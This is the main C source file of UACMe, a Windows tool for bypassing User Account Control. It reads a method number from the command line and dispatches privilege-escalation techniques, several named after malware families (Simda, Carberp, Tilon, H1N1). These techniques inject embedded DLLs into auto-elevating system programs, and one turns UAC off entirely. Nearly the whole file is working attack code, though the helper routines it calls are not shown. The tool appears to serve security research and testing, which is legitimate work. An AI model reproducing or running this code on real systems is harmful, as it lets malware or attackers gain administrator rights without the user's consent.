/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2014 - 2015
*
*  TITLE:       MAIN.C
*
*  VERSION:     1.92
*
*  DATE:        14 Oct 2015
*
*  Injector entry point.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"
#include <VersionHelpers.h>

ELOAD_PARAM_GLOBAL g_ldp;

#ifdef _WIN64
#include "hibiki64.h"
#include "fubuki64.h"
#define INJECTDLL Fubuki64
#define AVRFDLL	Hibiki64
#else
#include "hibiki32.h"
#include "fubuki32.h"
#define INJECTDLL Fubuki32
#define AVRFDLL Hibiki32
#endif

#if (_MSC_VER >= 1900) 
#ifdef _DEBUG
#pragma comment(lib, "vcruntimed.lib")
#pragma comment(lib, "ucrtd.lib")
#else
#pragma comment(lib, "libvcruntime.lib")
#endif
#endif

#define PROGRAMTITLE TEXT("UACMe")
#define WOW64STRING TEXT("Apparently it seems you are running under WOW64.\n\r\
This is not supported, run x64 version of this tool.")
#define WOW64WIN32ONLY TEXT("This method only works from x86-32 Windows or Wow64")
#define LAZYWOW64UNSUPPORTED TEXT("Use 32 bit version of this tool on 32 bit OS version")

#define UACFIX TEXT("This method fixed/unavailable in the current version of Windows, do you still want to continue?")

/*
* ucmShowMessage
*
* Purpose:
*
* Output message to user.
*
*/
VOID ucmShowMessage(
	LPWSTR lpszMsg
	)
{
	if (lpszMsg) {
		MessageBoxW(GetDesktopWindow(), 
			lpszMsg, PROGRAMTITLE, MB_ICONINFORMATION);
	}
}

/*
* ucmShowQuestion
*
* Purpose:
*
* Output message with question to user.
*
*/
INT ucmShowQuestion(
	LPWSTR lpszMsg
	)
{
	return MessageBoxW(GetDesktopWindow(), lpszMsg, PROGRAMTITLE, MB_YESNO);
}


/*
* ucmInit
*
* Purpose:
*
* Prestart phase.
*
*/
UINT ucmInit(
	VOID
	)
{
	//fill common data block
	RtlSecureZeroMemory(&g_ldp, sizeof(g_ldp));

	//remember dll handles
	g_ldp.hKernel32 = GetModuleHandleW(L"kernel32.dll");
	if (g_ldp.hKernel32 == NULL) {
		return ERROR_INVALID_HANDLE;
	}
	g_ldp.hOle32 = GetModuleHandleW(L"ole32.dll");
	if (g_ldp.hOle32 == NULL) {
		g_ldp.hOle32 = LoadLibraryW(L"ole32.dll");
		if (g_ldp.hOle32 == NULL) {
			return ERROR_INVALID_HANDLE;
		}
	}
	g_ldp.hShell32 = GetModuleHandleW(L"shell32.dll");
	if (g_ldp.hShell32 == NULL) {
		g_ldp.hShell32 = LoadLibraryW(L"shell32.dll");
		if (g_ldp.hShell32 == NULL) {
			return ERROR_INVALID_HANDLE;
		}
	}

	//query basic directories
	if (GetSystemDirectoryW(g_ldp.szSystemDirectory, MAX_PATH) == 0) {
		return ERROR_INVALID_DATA;
	}

	//query build number
	RtlSecureZeroMemory(&g_ldp.osver, sizeof(g_ldp.osver));
	g_ldp.osver.dwOSVersionInfoSize = sizeof(g_ldp.osver);
	if (!NT_SUCCESS(RtlGetVersion(&g_ldp.osver))) {
		return ERROR_INVALID_ACCESS;
	}

	g_ldp.IsWow64 = supIsProcess32bit(GetCurrentProcess());

	return ERROR_SUCCESS;
}

/*
* ucmMain
*
* Purpose:
*
* Program entry point.
*
*/
UINT ucmMain()
{
	DWORD                   bytesIO, dwType, paramLen;
	WCHAR                   *p;
	WCHAR                   szBuffer[MAX_PATH + 1];
	TOKEN_ELEVATION_TYPE    ElevType;


	if (ucmInit() != ERROR_SUCCESS) {
		return ERROR_INTERNAL_ERROR;
	}

	//query windows version
	if (!supIsWindowsVersionOrGreater(HIBYTE(_WIN32_WINNT_WIN7), LOBYTE(_WIN32_WINNT_WIN7), 0)) {
		ucmShowMessage(TEXT("This Windows is unsupported."));
		return ERROR_NOT_SUPPORTED;
	}

	ElevType = TokenElevationTypeDefault;
	if (!supGetElevationType(&ElevType)) {
		return ERROR_INVALID_ACCESS;
	}

	if (ElevType != TokenElevationTypeLimited) {
		ucmShowMessage(TEXT("Admin account with limited token required."));
		return ERROR_NOT_SUPPORTED;
	}

	dwType = 0;
	bytesIO = 0;
	RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
	GetCommandLineParam(GetCommandLine(), 1, szBuffer, MAX_PATH, &bytesIO);
	if (bytesIO == 0) {
		return ERROR_INVALID_DATA;
	}
	
	dwType = strtoul(szBuffer);
	switch (dwType) {

	case METHOD_SYSPREP1://cryptbase
		if (g_ldp.osver.dwBuildNumber > 9200) {
			if (ucmShowQuestion(UACFIX) == IDNO)
				return ERROR_UNSUPPORTED_TYPE;
		}
		break;

	case METHOD_SYSPREP2://shcore
		if (g_ldp.osver.dwBuildNumber != 9600) {
			if (ucmShowQuestion(UACFIX) == IDNO)
				return ERROR_UNSUPPORTED_TYPE;
		}
		break;

	case METHOD_SYSPREP3://dbgcore
		if (g_ldp.osver.dwBuildNumber != 10240)	{
			if (ucmShowQuestion(UACFIX) == IDNO)
				return ERROR_UNSUPPORTED_TYPE;
		}
		break;

	case METHOD_OOBE://oobe service
		if (g_ldp.osver.dwBuildNumber >= 10548) {
			if (ucmShowQuestion(UACFIX) == IDNO)
				return ERROR_UNSUPPORTED_TYPE;
		}
		break;

	case METHOD_REDIRECTEXE:
		if (g_ldp.osver.dwBuildNumber > 9600) {
			if (ucmShowQuestion(UACFIX) == IDNO)
				return ERROR_UNSUPPORTED_TYPE;
		}

#ifdef _WIN64
		ucmShowMessage(WOW64WIN32ONLY);
		return ERROR_UNSUPPORTED_TYPE;
#endif
		break;

	case METHOD_SIMDA:
		if (g_ldp.osver.dwBuildNumber >= 10136) {
			if (ucmShowQuestion(UACFIX) == IDNO)
				return ERROR_UNSUPPORTED_TYPE;
		}
		break;

	case METHOD_CARBERP:
		if (g_ldp.osver.dwBuildNumber >= 10147) {
			if (ucmShowQuestion(UACFIX) == IDNO)
				return ERROR_UNSUPPORTED_TYPE;
		}
		break;

	case METHOD_CARBERP_EX:
		if (g_ldp.osver.dwBuildNumber >= 10147) {
			if (ucmShowQuestion(UACFIX) == IDNO)
				return ERROR_UNSUPPORTED_TYPE;
		}
		break;

	case METHOD_TILON:
		if (g_ldp.osver.dwBuildNumber > 9200) {
			if (ucmShowQuestion(UACFIX) == IDNO)
				return ERROR_UNSUPPORTED_TYPE;
		}
		break;

	case METHOD_AVRF:
		if (g_ldp.osver.dwBuildNumber >= 10136) {
			if (ucmShowQuestion(UACFIX) == IDNO)
				return ERROR_UNSUPPORTED_TYPE;
		}
		break;

	case METHOD_WINSAT:
		if (g_ldp.osver.dwBuildNumber >= 10548) {
			if (ucmShowQuestion(UACFIX) == IDNO)
				return ERROR_UNSUPPORTED_TYPE;
		}
		break;

	case METHOD_SHIMPATCH:
		if (g_ldp.osver.dwBuildNumber > 9600) {
			if (ucmShowQuestion(UACFIX) == IDNO)
				return ERROR_UNSUPPORTED_TYPE;
		}

#ifdef _WIN64
		ucmShowMessage(WOW64WIN32ONLY);
		return ERROR_UNSUPPORTED_TYPE;
#endif		
		break;

	case METHOD_MMC:
		break;

	case METHOD_H1N1:
		if (g_ldp.osver.dwBuildNumber >= 10548) {
			if (ucmShowQuestion(UACFIX) == IDNO)
				return ERROR_UNSUPPORTED_TYPE;
		}
		break;
	}

	//prepare command for payload
	paramLen = 0;
	RtlSecureZeroMemory(&szBuffer, sizeof(szBuffer));
	GetCommandLineParam(GetCommandLine(), 2, szBuffer, MAX_PATH, &paramLen);
	if (paramLen > 0) {
		if (dwType != METHOD_REDIRECTEXE) {
			supSetParameter((LPWSTR)&szBuffer, paramLen * sizeof(WCHAR));
		}
	}

	switch (dwType) {

	case METHOD_SYSPREP1:
	case METHOD_SYSPREP2:
	case METHOD_SYSPREP3:
	case METHOD_OOBE:
	case METHOD_TILON:

		//
		// Since we are using injection and not using heavens gate/syswow64, we should ban usage under wow64.
		//
#ifndef _DEBUG
		if (g_ldp.IsWow64) {
			ucmShowMessage(WOW64STRING);
			return ERROR_UNSUPPORTED_TYPE;
		}
#endif
		if (ucmStandardAutoElevation(dwType, (CONST PVOID)INJECTDLL, sizeof(INJECTDLL))) {
			OutputDebugString(TEXT("[UCM] Standard AutoElevation method called\n\r"));
		}
		break;

//
//  Allow only in 32 version.
//
#ifndef _WIN64
	case METHOD_REDIRECTEXE:
	case METHOD_SHIMPATCH:
		if (ucmAppcompatElevation(dwType, (CONST PVOID)INJECTDLL, sizeof(INJECTDLL), (paramLen != 0) ? szBuffer : NULL )) {
			OutputDebugString(TEXT("[UCM] AppCompat method called\n\r"));
		}
		break;
#endif
	case METHOD_SIMDA:

		//
		// Since we are using injection and not using heavens gate, we should ban usage under wow64.
		//
#ifndef _DEBUG
		if (g_ldp.IsWow64) {
			ucmShowMessage(WOW64STRING);
			return ERROR_UNSUPPORTED_TYPE;
		}
#endif
		if (MessageBox(GetDesktopWindow(),
			TEXT("This method will TURN UAC OFF, are you sure? You will need to reenable it after manually."),
			PROGRAMTITLE, MB_ICONQUESTION | MB_YESNO) == IDYES) 
		{
			if (ucmSimdaTurnOffUac()) {
				OutputDebugString(TEXT("[UCM] Simda method called\n\r"));
			}
		}
		break;

	case METHOD_CARBERP:
	case METHOD_CARBERP_EX:

		if (dwType == METHOD_CARBERP) {

			//there is no migmiz in syswow64 in 8+
			if ((g_ldp.IsWow64) && (g_ldp.osver.dwBuildNumber > 7601)) {
				ucmShowMessage(WOW64STRING);
				return ERROR_UNSUPPORTED_TYPE;
			}
		}

		if (dwType == METHOD_CARBERP_EX) {
#ifndef _DEBUG
			if (g_ldp.IsWow64) {
				ucmShowMessage(WOW64STRING);
				return ERROR_UNSUPPORTED_TYPE;
			}
#endif
		}

		if (ucmWusaMethod(dwType, (CONST PVOID)INJECTDLL, sizeof(INJECTDLL))) {
			OutputDebugString(TEXT("[UCM] Carberp method called\n\r"));
		}
		break;

	case METHOD_AVRF:
#ifndef _DEBUG
		if (g_ldp.IsWow64) {
			ucmShowMessage(WOW64STRING);
			return ERROR_UNSUPPORTED_TYPE;
		}
#endif
		if (ucmAvrfMethod((CONST PVOID)AVRFDLL, sizeof(AVRFDLL))) {
			OutputDebugString(TEXT("[UCM] AVrf method called\n\r"));
		}	
		break;

	case METHOD_WINSAT:
		//
		// Decoding WOW64 environment, turning wow64fs redirection is meeh. Just drop it as it just a test tool.
		//
		if (g_ldp.IsWow64) {
			ucmShowMessage(LAZYWOW64UNSUPPORTED);
			return ERROR_UNSUPPORTED_TYPE;
		}

		if (g_ldp.osver.dwBuildNumber < 9200) {
			p = L"powrprof.dll";
		}
		else {
			p = L"devobj.dll";
		}

		if (ucmWinSATMethod(p, (CONST PVOID)INJECTDLL, sizeof(INJECTDLL), (g_ldp.osver.dwBuildNumber <= 10136))) {
			OutputDebugString(TEXT("[UCM] WinSAT method called\n\r"));
		}
		break;

	case METHOD_MMC:
		if (g_ldp.IsWow64) {
			ucmShowMessage(WOW64STRING);
			return ERROR_UNSUPPORTED_TYPE;
		}
		p = L"elsext.dll";
		if (ucmMMCMethod(p, (CONST PVOID)INJECTDLL, sizeof(INJECTDLL))) {
			OutputDebugString(TEXT("[UCM] MMC method called\n\r"));
		}
		break;

	case METHOD_H1N1:
		if (g_ldp.IsWow64) {
			ucmShowMessage(WOW64STRING);
			return ERROR_UNSUPPORTED_TYPE;
		}

		if (ucmH1N1Method((CONST PVOID)INJECTDLL, sizeof(INJECTDLL))) {
			OutputDebugString(TEXT("[UCM] H1N1 method called\n\r"));
		}
		break;
	}
	
	return ERROR_SUCCESS;
}

VOID main()
{
	ExitProcess(ucmMain());
}
